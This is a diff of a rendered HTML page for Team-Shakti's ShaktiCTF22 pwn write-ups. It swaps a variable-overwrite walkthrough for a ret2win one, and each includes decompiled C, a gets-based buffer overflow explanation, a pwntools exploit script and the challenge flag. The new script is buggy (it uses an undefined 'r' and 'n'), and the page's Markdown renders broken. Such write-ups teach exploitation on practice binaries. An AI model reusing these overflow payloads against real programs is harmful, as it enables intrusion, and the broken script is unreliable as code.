@@ -6,9 +6,9 @@
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         
         
-        <link rel="canonical" href="https://github.com/Team-Shakti/CTF-Write-ups/ShaktiCTF22/pwn/guess the key/writeup/">
+        <link rel="canonical" href="https://github.com/Team-Shakti/CTF-Write-ups/ShaktiCTF22/pwn/play_to_win/writeup/">
         <link rel="shortcut icon" href="../../../../img/favicon.ico">
-        <title>Shaktictf 22 write-ups - CTF-Writeups</title>
+        <title>Shaktictf 22 writeups - CTF-Writeups</title>
         <link href="../../../../css/bootstrap-custom.min.css" rel="stylesheet">
         <link href="../../../../css/font-awesome.min.css" rel="stylesheet">
         <link href="../../../../css/base.css" rel="stylesheet">
@@ -64,7 +64,7 @@
                             </a>
                         </li>
                             <li>
-                                <a href="https://github.com/Team-Shakti/CTF-Write-ups/blob/master/docs/ShaktiCTF22/pwn/guess the key/writeup.md">Edit on Team-Shakti/CTF-Write-ups</a>
+                                <a href="https://github.com/Team-Shakti/CTF-Write-ups/blob/master/docs/ShaktiCTF22/pwn/play_to_win/writeup.md">Edit on Team-Shakti/CTF-Write-ups</a>
                             </li>
                     </ul>
                 </div>
@@ -74,55 +74,122 @@
         <div class="container">
                 <div class="col-md-3"><div class="bs-sidebar hidden-print affix well" role="complementary">
     <ul class="nav bs-sidenav">
-        <li class="main active"><a href="#shaktictf-22-write-ups">Shaktictf 22 write-ups</a></li>
-            <li><a href="#guess-the-key">Guess the key</a></li>
+        <li class="main active"><a href="#shaktictf-22-writeups">Shaktictf 22 writeups</a></li>
+            <li><a href="#play-to-win">Play to win</a></li>
     </ul>
 </div></div>
                 <div class="col-md-9" role="main">
 
-<h1 id="shaktictf-22-write-ups">Shaktictf 22 write-ups</h1>
-<h2 id="guess-the-key">Guess the key</h2>
-<p>DESCRIPTION:
-Guess the correct key to win!</p>
-<p>Note:The server is running on Ubuntu 20.04.</p>
-<p>Author: Claire de lune</p>
+<h1 id="shaktictf-22-writeups">Shaktictf 22 writeups</h1>
+<h2 id="play-to-win">Play to win</h2>
+<p>DESCRIPTION:</p>
+<p>I was playing a game of adding words with my friends, until I added one too long!</p>
+<p>Note: The server is running on Ubuntu 20.04.</p>
 <p>FLAG FORMAT: shakti{}</p>
-<h3 id="intended-solution">Intended solution</h3>
-<p>This is a basic variable overwrite challenge.
-A binary file is given as an attachment, where the usual checks give:</p>
-<p><img alt="" src="https://i.imgur.com/bwRNZWV.png" /></p>
-<p><img alt="" src="https://i.imgur.com/iuONMGu.png" /></p>
+<h3 id="intended-solution">Intended solution:</h3>
+<p>This is a basic ret2win challenge.</p>
+<p>A binary file is given as an attachment, where the usual checks give:</p>
+<p><img alt="" src="https://i.imgur.com/NqZOOmp.png" /></p>
+<p><img alt="" src="https://i.imgur.com/BVAl2Cl.png" /></p>
 <p>Running the file-</p>
-<p><img alt="" src="https://i.imgur.com/pIXUlKL.png" /></p>
-<p>Decompiling the func fuction in binary gives the following-</p>
-<pre><code>int func()
+<p><img alt="" src="https://i.imgur.com/3gEnXL2.png" /></p>
+<p>Decompiling the game fuction in binary gives the following-</p>
+<pre><code>int game()
 {
-  char v1[60]; // [rsp+0h] [rbp-40h] BYREF
-  int v2; // [rsp+3Ch] [rbp-4h]
+  int result; // eax
+  int v1; // eax
+  char v2[2]; // [rsp+8h] [rbp-18h] BYREF
+  char s[10]; // [rsp+Ah] [rbp-16h] BYREF
+  int v4; // [rsp+14h] [rbp-Ch]
+  int v5; // [rsp+18h] [rbp-8h]
+  int v6; // [rsp+1Ch] [rbp-4h]
 
-  puts(&quot;Guess the correct key to win!&quot;);
-  v2 = -559038737;
-  printf(&quot;Enter the key: &quot;);
-  gets(v1);
-  if ( v2 == -889275714 )
-    return system(&quot;cat flag.txt&quot;);
-  puts(&quot;Wrong Key&quot;);
-  return puts(&quot;Try again!&quot;);
+  puts(&quot;You think you can do this?&quot;);
+  result = puts(&quot;I don't think so.&quot;);
+  v5 = 0;
+  v4 = 0;
+  while ( v5 != 1 )
+  {
+    printf(&quot;Add the word:&quot;);
+    gets(s);        //gets function here!
+    v1 = strlen(s);
+    result = v1 + v4;
+    v4 = result;
+    if ( result == 10000 )
+    {
+      v5 = 1;
+      v6 = 1;
+      break;
+    }
+    puts(&quot;Do you want to continue?&quot;);
+    printf(&quot;Yes or No [y/n]:&quot;);
+    __isoc99_scanf(&quot;%s&quot;, v2);
+    getchar();
+    result = (unsigned __int8)v2[0];
+    if ( v2[0] == 121 || (result = (unsigned __int8)v2[0], v2[0] == 89) )
+    {
+      v5 = 0;
+    }
+    else
+    {
+      result = (unsigned __int8)v2[0];
+      if ( v2[0] == 110 || (result = (unsigned __int8)v2[0], v2[0] == 78) )
+        v5 = 1;
+      else
+        result = puts(&quot;Wrong input.&quot;);
+    }
+  }
+  if ( v6 == 1 )
+  {
+    winfunc();
+    exit(0);
+  }
+  return result;
 }
 </code></pre>
 
-<p>Here '-559038737' is <code>0xdeadbeef</code> and '-889275714' is <code>0xcafebabe</code>.We have to overwrite the variable v2 to <code>0xcafebabe</code> to pass the check and cat flag.</p>
-<p>There is a gets function present in func(). So we can we can overfow the buffer and then access v2 through that.
-On the stack, the size of v1 is 60 bytes, in order to overwrite v2, we must overflow v1 with 60 bytes of junk data and then overwrite v1 with <code>0xcafebabe</code></p>
-<p>Exploit:
-<code>python=
-(from pwn import *
-elf = ELF("variable")
-io = process(elf.path)
-payload =b'a'*60 + p64(0xcafebabe)
-io.sendline(payload)
-io.interactive()</code>
-This gives us the flag: <code>shakti{0verWr171ng_15_FuN}</code></p></div>
+<p>The basic objective of the game is to add words till the combined length of them all reaches 10000, upon which the game re-directs to a winfunc(), where it prints :
+ ```
+Ah well, you did win afterall.
+I guess congratlations are in order.</p>
+<pre><code> On opening the file in gdb and observing all the functions-
+
+![](https://i.imgur.com/hBilDaC.png)
+
+We see that there are two win fuctions here, winfunc and reallywin.And reallywin shows:
+</code></pre>
+
+<p>void __noreturn reallywin()
+{
+  puts("I may have underestimated you");
+  puts("You win!");
+  system("cat flag.txt");
+  exit(0);
+}</p>
+<pre><code>So basically you just have to redirect the control flow of the rip to reallywin. We have a gets fuction here, so we can overflow and overwrite rip.
+
+Now as stack is 16 bit aligned, it took 30 bytes of data to overwrite the buffer and we have to use the ret gadget to return back to the stack and overwrite rip with address of `reallywin`
+
+
+Exploit:
+
+```python
+from pwn import *
+elf = ELF(&quot;game&quot;)
+io=process(elf.path)
+ret = 0x40101a # Used to align stack
+
+win = elf.symbols['reallywin']
+
+#Fill the Buffer with 30 A's --&gt; overwrite return address with ret gadget to align the stack --&gt; then address of the reallywin function
+payload = b&quot;A&quot;*30 + p64(ret) + p64(win)
+r.sendline(payload)
+r.sendline(n) #to pass last check
+r.interactive()
+</code></pre>
+
+<p>This gives the flag:
+<code>shakti{G0od_joB_5olviNg_Thi5_1}</code></p></div>
         </div>
 
         <footer class="col-md-12">
